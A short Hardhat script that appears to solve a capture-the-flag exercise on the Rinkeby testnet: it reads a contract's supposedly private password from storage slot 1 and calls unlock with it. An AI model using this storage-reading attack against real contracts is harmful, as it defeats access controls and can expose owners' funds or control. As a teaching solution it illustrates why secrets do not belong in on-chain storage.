import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.RINKEBY_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x99A5EbD95B475BC1329f5961FeAaF97a725B6459"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "bytes32",
          name: "_password",
          type: "bytes32",
        },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [],
      name: "locked",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xcf309012",
    },
    {
      inputs: [
        {
          internalType: "bytes32",
          name: "_password",
          type: "bytes32",
        },
      ],
      name: "unlock",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xec9b5b3a",
    },
  ]

  const pwd = await provider.getStorageAt(targetAddress, 1)
  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const tx = await target.unlock(pwd)
  const receipt = await tx.wait()

  console.log(
    `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
  )

  console.log(`Lock status ${await target.locked()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
